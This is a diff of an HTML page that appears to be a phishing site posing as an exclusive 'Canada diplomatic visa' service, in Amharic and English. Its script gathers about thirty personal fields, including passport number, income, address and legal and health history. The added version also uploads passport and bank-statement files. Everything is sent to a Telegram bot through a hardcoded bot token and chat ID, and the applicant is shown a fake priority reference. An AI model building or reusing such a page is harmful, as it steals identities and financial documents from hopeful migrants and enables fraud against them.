@@ -1,374 +1,351 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="am">
 <head>
-<meta charset="UTF-8">
-<title>Private Visa Application | Canada</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Canada Private Visa | Black Label Executive</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,900&family=Montserrat:wght@200;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --obsidian: #050505;
+            --gold-bright: #fceabb;
+            --gold-deep: #c09647;
+            --luxury-gradient: linear-gradient(135deg, #fceabb 0%, #f8d47b 20%, #c09647 50%, #f8d47b 80%, #fceabb 100%);
+            --gold-shadow: rgba(192, 150, 71, 0.4);
+        }
 
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
-<style>
-:root{
-  --navy:#070f1f;
-  --gold:#c9a646;
-  --soft-gold:#e8d9a3;
-  --glass:rgba(255,255,255,0.12);
-  --border:rgba(255,255,255,0.22);
-  --text:#ffffff;
-  --muted:rgba(255,255,255,0.65);
-}
+        body {
+            margin: 0;
+            background: var(--obsidian);
+            font-family: 'Montserrat', sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            overflow-x: hidden;
+        }
 
-/* BACKGROUND */
-body{
-  margin:0;
-  min-height:100vh;
-  font-family:Inter,system-ui,sans-serif;
-  background:
-    radial-gradient(1200px at top right,#132b52 0%,transparent 60%),
-    radial-gradient(1000px at bottom left,#091225 0%,transparent 55%),
-    linear-gradient(180deg,#050b18,#02060f);
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  color:var(--text);
-}
+        /* AMBIENT LUXURY BACKGROUND */
+        body::before {
+            content: "";
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 20% 30%, #1a150e 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, #1a150e 0%, transparent 50%);
+            z-index: -1;
+        }
 
-/* CONTAINER */
-.container{
-  width:95%;
-  max-width:980px;
-  background:linear-gradient(180deg, rgba(255,255,255,0.14), rgba(255,255,255,0.08));
-  backdrop-filter:blur(22px);
-  border-radius:26px;
-  padding:52px;
-  box-shadow:0 60px 120px rgba(0,0,0,0.75), inset 0 0 0 1px var(--border);
-  position:relative;
-}
+        .elite-container {
+            width: 100%;
+            max-width: 480px;
+            padding: 60px 24px;
+        }
 
-/* HEADER */
-header{
-  display:flex;
-  justify-content:space-between;
-  align-items:flex-end;
-  padding-bottom:26px;
-  margin-bottom:38px;
-  border-bottom:1px solid rgba(255,255,255,0.18);
-}
-.brand h1{
-  margin:0;
-  font-family:"Playfair Display",serif;
-  font-size:30px;
-  font-weight:600;
-  letter-spacing:0.6px;
-  background:linear-gradient(90deg,var(--gold),var(--soft-gold));
-  -webkit-background-clip:text;
-  -webkit-text-fill-color:transparent;
-}
-.brand span{
-  display:block;
-  margin-top:10px;
-  font-size:13px;
-  letter-spacing:0.8px;
-  color:var(--muted);
-  text-transform:uppercase;
-}
-.lang-btn{
-  background:transparent;
-  color:var(--soft-gold);
-  border:1px solid rgba(201,166,70,0.55);
-  padding:10px 22px;
-  border-radius:999px;
-  font-weight:600;
-  letter-spacing:0.5px;
-  cursor:pointer;
-  transition:0.35s ease;
-}
-.lang-btn:hover{
-  background:rgba(201,166,70,0.15);
-  box-shadow:0 0 0 3px rgba(201,166,70,0.12);
-}
+        header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
 
-/* FORM */
-.form-group{
-  margin-bottom:22px;
-}
-label{
-  display:block;
-  margin-bottom:10px;
-  font-size:13px;
-  font-weight:600;
-  letter-spacing:0.4px;
-  color:var(--gold);
-}
-input, select{
-  width:100%;
-  padding:16px 18px;
-  border-radius:16px;
-  border:1px solid rgba(255,255,255,0.18);
-  background:rgba(5,10,20,0.55);
-  color:white;
-  font-size:15px;
-  transition:0.35s ease;
-}
-input::placeholder{
-  color:rgba(255,255,255,0.35);
-}
-input:focus{
-  outline:none;
-  border-color:var(--gold);
-  background:rgba(5,10,20,0.7);
-  box-shadow:0 0 0 3px rgba(201,166,70,0.18), inset 0 0 0 1px rgba(201,166,70,0.25);
-}
+        .emblem {
+            font-size: 42px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 15px var(--gold-shadow));
+            animation: pulse 3s infinite ease-in-out;
+        }
 
-/* SUBMIT BUTTON */
-.submit-btn{
-  width:100%;
-  margin-top:42px;
-  padding:20px;
-  border-radius:20px;
-  border:none;
-  font-size:16px;
-  font-weight:700;
-  letter-spacing:1px;
-  cursor:pointer;
-  background:linear-gradient(135deg,#e6cf7c,#b8942e);
-  color:#0b0b0b;
-  transition:0.45s ease;
-}
-.submit-btn:hover{
-  transform:translateY(-4px);
-  box-shadow:0 25px 60px rgba(201,166,70,0.55);
-}
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
 
-/* LUXURY POPUP */
-.popup{
-  position:fixed;
-  top:50%;
-  left:50%;
-  transform:translate(-50%,-50%) scale(0.8);
-  background:linear-gradient(145deg,#e6cf7c,#b8942e);
-  color:#0b0b0b;
-  padding:25px 40px;
-  border-radius:22px;
-  font-family:"Playfair Display", serif;
-  font-size:16px;
-  font-weight:600;
-  text-align:center;
-  opacity:0;
-  pointer-events:none;
-  box-shadow:0 20px 50px rgba(0,0,0,0.6);
-  animation:none;
-  z-index:1000;
-  max-width:90%;
-  overflow:auto;
-  max-height:80%;
-}
-.popup.show{
-  opacity:1;
-  pointer-events:auto;
-  animation:popupAnim 0.5s ease forwards;
-}
-@keyframes popupAnim{
-  0%{transform:translate(-50%,-50%) scale(0.8); opacity:0;}
-  50%{transform:translate(-50%,-50%) scale(1.05); opacity:1;}
-  100%{transform:translate(-50%,-50%) scale(1); opacity:1;}
-}
-.popup table{
-  width:100%;
-  border-collapse:collapse;
-  margin-top:15px;
-}
-.popup table tr{
-  opacity:0;
-  transform:translateY(10px);
-  animation:rowFade 0.5s forwards;
-}
-@keyframes rowFade{
-  to{opacity:1; transform:translateY(0);}
-}
-.popup table td{
-  padding:6px 8px;
-  border-bottom:1px solid rgba(0,0,0,0.1);
-}
-.popup table td:first-child{
-  font-weight:600;
-  color:#0b0b0b;
-}
-.popup table td:last-child{
-  color:#0b0b0b;
-  text-align:right;
-}
-.popup .file-row td{
-  border:1px solid #ffd700;
-  background:rgba(255,223,0,0.1);
-  font-weight:700;
-}
+        .gold-title {
+            font-family: 'Playfair Display', serif;
+            font-weight: 900;
+            font-size: 32px;
+            background: var(--luxury-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+        }
 
-/* FOOTER */
-footer{
-  margin-top:42px;
-  text-align:center;
-  font-size:12px;
-  letter-spacing:0.4px;
-  color:var(--muted);
-}
-</style>
+        .security-ribbon {
+            font-size: 10px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            color: #888;
+            font-weight: 400;
+        }
+
+        /* THE MAXIMUM LUXURY BUTTON */
+        .lang-switch-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-top: 35px;
+            padding: 2px; /* For the border effect */
+            background: var(--luxury-gradient);
+            border-radius: 50px;
+            animation: rotate-bg 4s linear infinite;
+        }
+
+        @keyframes rotate-bg {
+            to { filter: hue-rotate(360deg); }
+        }
+
+        .lang-toggle {
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 12px 35px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            display: block;
+            transition: 0.3s;
+        }
+
+        .lang-toggle:hover {
+            background: transparent;
+            color: #000;
+        }
+
+        /* OBSIDIAN GLASS CARD */
+        .obsidian-card {
+            background: linear-gradient(165deg, rgba(30,30,30,0.8) 0%, rgba(5,5,5,0.95) 100%);
+            border: 1px solid rgba(252, 234, 187, 0.15);
+            border-radius: 45px;
+            padding: 45px 30px;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.9), inset 0 0 20px rgba(192, 150, 71, 0.05);
+            backdrop-filter: blur(20px);
+        }
+
+        .field-label {
+            font-size: 9px;
+            font-weight: 800;
+            color: #c09647;
+            text-transform: uppercase;
+            letter-spacing: 2.5px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 30px;
+            transition: all 0.4s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #fceabb;
+            background: rgba(192, 150, 71, 0.1);
+            box-shadow: 0 0 20px rgba(192, 150, 71, 0.2);
+        }
+
+        .file-zone {
+            border: 1px solid rgba(192, 150, 71, 0.3);
+            background: rgba(0,0,0,0.4);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        /* THE MASTER BUTTON */
+        .btn-elite {
+            width: 100%;
+            padding: 24px;
+            border: none;
+            border-radius: 15px;
+            background: var(--luxury-gradient);
+            color: #000;
+            font-weight: 900;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            box-shadow: 0 15px 35px var(--gold-shadow);
+            transition: 0.5s ease;
+        }
+
+        .btn-elite:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 50px rgba(252, 234, 187, 0.4);
+            filter: brightness(1.1);
+        }
+
+        /* MODAL */
+        #executiveModal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98); display: none; align-items: center; justify-content: center;
+            z-index: 10000;
+        }
+
+        .modal-inner {
+            text-align: center;
+            max-width: 420px;
+            padding: 40px;
+            border: 1px solid var(--gold-deep);
+            border-radius: 30px;
+            background: #000;
+        }
+
+        .ref-tag {
+            background: var(--luxury-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            border: 1px solid #c09647;
+            padding: 8px 20px;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            display: inline-block;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="container">
+<div class="elite-container">
+    <header>
+        <div class="emblem">⚜️</div>
+        <div class="gold-title" id="mainTitle">የካናዳ ዲፕሎማቲክ ቪዛ አገልግሎት</div>
+        <div class="security-ribbon">Executive Tier · Encrypted</div>
+        
+        <div class="lang-switch-wrapper">
+            <button class="lang-toggle" id="langBtn" onclick="toggleLang()">English</button>
+        </div>
+    </header>
 
-<header>
-  <div class="brand">
-    <h1 id="title">Private Canada Visa Application</h1>
-    <span>Confidential · Invitation Only · Premium Clients</span>
-  </div>
-  <button class="lang-btn" onclick="toggleLang()">አማርኛ</button>
-</header>
+    <div class="obsidian-card">
+        <form id="visaForm">
+            <div id="surveyFields"></div>
 
-<form id="visaForm">
-  <div id="questions"></div>
+            <span class="field-label" id="l_pass">የፓስፖርት ኮፒ (Diplomatic Passport Copy)</span>
+            <div class="file-zone">
+                <input type="file" id="passportFile" required>
+            </div>
 
-  <div class="form-group">
-    <label>Upload Passport Copy</label>
-    <input type="file" name="passportFile" accept=".pdf,.jpg,.jpeg,.png">
-  </div>
-  <div class="form-group">
-    <label>Upload Bank Statement</label>
-    <input type="file" name="bankFile" accept=".pdf,.jpg,.jpeg,.png">
-  </div>
+            <span class="field-label" id="l_bank">የባንክ ሂሳብ መግለጫ (Verification of Liquidity)</span>
+            <div class="file-zone">
+                <input type="file" id="bankFile" required>
+            </div>
 
-  <button class="submit-btn" type="submit" id="submitBtn">
-    Submit Confidential Application
-  </button>
-</form>
+            <button type="submit" class="btn-elite" id="btnText">ምዝገባውን ያጠናቅቁ</button>
+        </form>
+    </div>
+</div>
 
-<div class="popup" id="popupMsg"></div>
-
-<footer>
-Independent private visa assessment service · All information encrypted & confidential
-</footer>
-
+<div id="executiveModal">
+    <div class="modal-inner" id="modalBox">
+        <div style="font-size: 60px; margin-bottom: 20px;">📜</div>
+        <h2 id="mHead" style="font-family: 'Playfair Display'; color: #fceabb;"></h2>
+        <div class="ref-tag" id="mRef"></div>
+        <p id="mBody" style="line-height: 1.8; color: #aaa; font-size: 14px;"></p>
+        <button class="btn-elite" style="padding: 15px; margin-top: 20px;" onclick="location.reload()">Acknowledge Receipt</button>
+    </div>
 </div>
 
 <script>
-// QUESTIONS
+const BOT_TOKEN = "8448242592:AAEv8lfXR9aRwB4Oyvve50tvxIWDG_MVJNE";
+const CHAT_ID = "7956760590";
+
 const questions = [
-["Full Name (as on passport)", "ሙሉ ስም (በፓስፖርት ላይ እንደተጻፈ)"],
-["Date of Birth", "የትውልድ ቀን"],
-["Gender", "ፆታ"],
-["Marital Status", "የጋብቻ ሁኔታ"],
-["Nationality", "ዜግነት"],
-["Country of Residence", "የመኖሪያ ሀገር"],
-["Passport Number", "የፓስፖርት ቁጥር"],
-["Passport Issue Date", "የፓስፖርት የተሰጠበት ቀን"],
-["Passport Expiry Date", "የፓስፖርት የማብቂያ ቀን"],
-["Phone Number", "ስልክ ቁጥር"],
-["Email Address", "የኢሜይል አድራሻ"],
-["Current Residential Address", "የአሁኑ መኖሪያ አድራሻ"],
-["Highest Level of Education", "ያጠናቀቁት ከፍተኛ የትምህርት ደረጃ"],
-["Field of Study", "የትምህርት መስክ"],
-["Current Occupation", "አሁን የሚሰሩት ስራ"],
-["Employer / Business Name", "የድርጅት / የንግድ ስም"],
-["Average Monthly Income", "ወርሃዊ ገቢ (በግምት)"],
-["Type of Visa Applying For", "የሚያመለክቱት የቪዛ አይነት"],
-["Main Purpose of Travel", "ዋና የጉዞ ምክንያት"],
-["Intended City / Province in Canada", "በካናዳ የሚጎበኙት ከተማ / ክልል"],
-["Planned Date of Travel", "የታቀደ የጉዞ ቀን"],
-["Expected Length of Stay", "በካናዳ የመቆያ ጊዜ"],
-["Have you traveled internationally before?", "ከኢትዮጵያ ውጭ ተጓዝተዋል?"],
-["Countries Visited (if any)", "የጎበኙት ሀገሮች (ካሉ)"],
-["Have you ever been refused a visa?", "ቪዛ ተከልክሎብዎት አለ?"],
-["Do you have family members in Canada?", "በካናዳ ቤተሰብ አለ?"],
-["Do you have a sponsor in Canada?", "በካናዳ የሚደግፍ ሰው አለ?"],
-["Proof of sufficient funds available?", "በቂ የገንዘብ ማስረጃ አለ?"],
-["Any medical condition to declare?", "ሊገልጹት የሚገባ የጤና ችግር አለ?"],
-["Additional Information", "ተጨማሪ መረጃ"]
+    ["Executive Name", "ባለሙሉ ስልጣን አመልካች ስም"], ["Direct Phone", "የቀጥታ ስልክ መስመር"], ["Age", "እድሜ"],
+    ["Profession", "የስራ መስክ"], ["Asset Value", "ወርሃዊ ገቢ"], ["Education", "የትምህርት ደረጃ"],
+    ["Marital Status", "የጋብቻ ሁኔታ"], ["Citizenship", "ዜግነት"], ["Passport No", "የፓስፖርት ቁጥር"],
+    ["Expiry Date", "የማብቂያ ቀን"], ["Residence", "የመኖሪያ አድራሻ"], ["Travel Purpose", "የጉዞው ዋና አላማ"],
+    ["Intended City", "መድረሻ ከተማ"], ["Visa Refusals", "ቀደም ሲል የተከለከሉ ቪዛዎች"], ["Global History", "የጎበኟቸው ሀገራት"],
+    ["Host in Canada", "በካናዳ የሚቀበልዎት አካል"], ["Languages", "የቋንቋ ችሎታ"], ["Departure", "የታቀደ የጉዞ ቀን"],
+    ["Dependents", "የልጆች ብዛት"], ["Seniority", "የስራ ልምድ"], ["Email", "ኢሜይል አድራሻ"],
+    ["Firm Name", "የመስሪያ ቤት ስም"], ["Duration", "የመቆያ ጊዜ"], ["Verified Funds", "ጠቅላላ የቁጠባ መጠን"],
+    ["Canada Contacts", "ካናዳ ያሉ ዘመዶች"], ["Emergency Rep", "ተጠሪ ተወካይ"], ["Rep Phone", "የተጠሪ ስልክ"],
+    ["Legal Standing", "የህግ ሪከርድ"], ["Health Profile", "የጤና ሁኔታ"], ["Concierge Note", "ለአማካሪው የሚተላለፍ መልዕክት"]
 ];
 
-// Render questions
-const qDiv = document.getElementById("questions");
-questions.forEach((q,i)=>{
-  qDiv.innerHTML+=`
-  <div class="form-group">
-    <label class="q-label">${q[1]}</label>
-    <input name="Q${i+1}" required>
-  </div>`;
+const container = document.getElementById('surveyFields');
+questions.forEach((q, i) => {
+    container.innerHTML += `
+        <span class="field-label" id="lbl${i}">${q[1]}</span>
+        <input id="f${i}" required placeholder="—">
+    `;
 });
 
-// Language toggle
-let lang="en";
-function toggleLang(){
-  lang=lang==="en"?"am":"en";
-  document.getElementById("title").innerText=
-    lang==="en"?"Private Canada Visa Application":"የግል የካናዳ ቪዛ መጠይቅ";
-  document.querySelector(".lang-btn").innerText=
-    lang==="en"?"አማርኛ":"English";
-  document.querySelectorAll(".q-label").forEach((l,i)=>{
-    l.innerText=lang==="en"?questions[i][0]:questions[i][1];
-  });
-  document.getElementById("submitBtn").innerText=
-    lang==="en"?"Submit Confidential Application":"መረጃ ላክ";
-}
+let currentLang = "am";
 
-// Telegram Bot
-const BOT_TOKEN="8448242592:AAEv8lfXR9aRwB4Oyvve50tvxIWDG_MVJNE";
-const CHAT_ID="7956760590";
-
-// FORM SUBMISSION
-document.getElementById("visaForm").addEventListener("submit", async function(e){
-  e.preventDefault();
-  const form = e.target;
-  const fd = new FormData(form);
-  const fullName = fd.get("Q1") || "Applicant";
-
-  // Build popup table
-  let popupHTML = `<div>✅ <strong>${fullName}</strong>, your application will be securely submitted!</div>`;
-  popupHTML += `<table>`;
-  let index =1;
-  fd.forEach((v,k)=>{
-    if(v instanceof File && v.name){
-      popupHTML += `<tr class="file-row"><td>${k}</td><td>${v.name}</td></tr>`;
-    } else {
-      popupHTML += `<tr style="animation-delay:${index*0.05}s"><td>${questions[index-1][0]}</td><td>${v}</td></tr>`;
-      index++;
-    }
-  });
-  popupHTML += `</table>`;
-  showPopup(popupHTML);
-
-  // Send Telegram
-  let message = `━━━━━━━━━━━━━━━━━━━━\n🇨🇦 PRIVATE VISA FILE\n━━━━━━━━━━━━━━━━━━━━\n👤 Applicant:\n${fullName}\n━━━━━━━━━━━━━━━━━━━━\n📄 APPLICATION DETAILS\n━━━━━━━━━━━━━━━━━━━━\n`;
-  index=1;
-  fd.forEach((v,k)=>{
-    if(v instanceof File && v.name){
-      message += `• ${k}: ${v.name}\n`;
-    } else {
-      message += `• ${questions[index-1][0]}: ${v}\n`;
-      index++;
-    }
-  });
-  message += `━━━━━━━━━━━━━━━━━━━━\n🔐 Submitted Securely\n🕒 ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━━━`;
-
-  try{
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHAT_ID,text:message})
+function toggleLang() {
+    const btn = document.getElementById("langBtn");
+    const isEn = currentLang === "am";
+    currentLang = isEn ? "en" : "am";
+    
+    btn.innerText = isEn ? "አማርኛ" : "English";
+    document.getElementById("mainTitle").innerText = isEn ? "Private Visa Concierge" : "የካናዳ ዲፕሎማቲክ ቪዛ አገልግሎት";
+    document.getElementById("btnText").innerText = isEn ? "Request Private Invite" : "ምዝገባውን ያጠናቅቁ";
+    
+    questions.forEach((q, i) => {
+        document.getElementById(`lbl${i}`).innerText = isEn ? q[0] : q[1];
     });
-    form.reset();
-  } catch(err){ console.error(err); }
-});
 
-// Popup function
-function showPopup(htmlContent){
-  const popup = document.getElementById("popupMsg");
-  popup.innerHTML = htmlContent;
-  popup.classList.add("show");
-  setTimeout(()=>popup.classList.remove("show"),6000);
+    document.getElementById("l_pass").innerText = isEn ? "Diplomatic Passport Copy" : "የፓስፖርት ኮፒ (Diplomatic Passport Copy)";
+    document.getElementById("l_bank").innerText = isEn ? "Verification of Liquidity" : "የባንክ ሂሳብ መግለጫ (Verification of Liquidity)";
 }
-</script>
 
+document.getElementById("visaForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const name = document.getElementById("f0").value;
+    const btn = document.getElementById("btnText");
+    const ref = "EXP-" + Math.floor(Math.random()*900000 + 100000);
+    
+    btn.disabled = true;
+    btn.innerText = currentLang === "en" ? "TRANSMITTING..." : "በመላክ ላይ...";
+
+    let report = `👑 *BLACK LABEL APPLICATION*\n*REF:* ${ref}\n\n`;
+    questions.forEach((q, i) => {
+        report += `*${q[0]}:* ${document.getElementById("f"+i).value}\n`;
+    });
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
+        });
+
+        const files = [document.getElementById("passportFile").files[0], document.getElementById("bankFile").files[0]];
+        for (let file of files) {
+            if(file) {
+                let fd = new FormData();
+                fd.append("chat_id", CHAT_ID);
+                fd.append("document", file);
+                fd.append("caption", `Ref: ${ref} | Applicant: ${name}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: fd });
+            }
+        }
+
+        document.getElementById("executiveModal").style.display = "flex";
+        document.getElementById("mRef").innerText = "PRIORITY ID: " + ref;
+        
+        if (currentLang === "en") {
+            document.getElementById("mHead").innerText = "Application Secured";
+            document.getElementById("mBody").innerText = `Honorable ${name}, your executive profile has been transmitted. Our VIP Concierge will contact you within 48 hours.`;
+        } else {
+            document.getElementById("mHead").innerText = "መረጃዎ ተመዝግቧል";
+            document.getElementById("mBody").innerText = `ክቡር/ክብርት ${name}፣ መረጃዎ በከፍተኛ ጥበቃ ለባለሙያዎቻችን ደርሷል። በቀጣዮቹ 48 ሰዓታት ውስጥ የቪዛ አማካሪዎቻችን ያገኙዎታል።`;
+        }
+        
+    } catch (err) {
+        alert("Secure Link Interrupted.");
+        btn.disabled = false;
+    }
+});
+</script>
 </body>
 </html>
